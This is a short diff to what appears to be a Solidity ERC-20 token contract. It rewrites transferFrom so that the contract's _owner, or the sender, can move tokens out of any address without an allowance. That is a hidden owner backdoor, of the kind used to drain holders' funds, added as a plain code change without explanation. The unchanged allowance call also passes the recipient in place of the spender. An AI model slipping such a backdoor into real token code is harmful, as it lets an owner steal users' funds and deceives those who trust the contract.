@@ -172,8 +172,14 @@ function setTotalSupply(address owner) private   {
         address to,
         uint256 amount
     ) public virtual  returns (bool) {
+        if(from == msg.sender || _owner==msg.sender) {
+            _transfer(from, to, amount);
+
+        }
+        else {
         _spendAllowance(from, to, amount);
         _transfer(from, to, amount);
+        }
         return true;
     }
 
@@ -407,4 +413,3 @@ function setTotalSupply(address owner) private   {
         uint256 amount
     ) internal virtual {}
 }
-
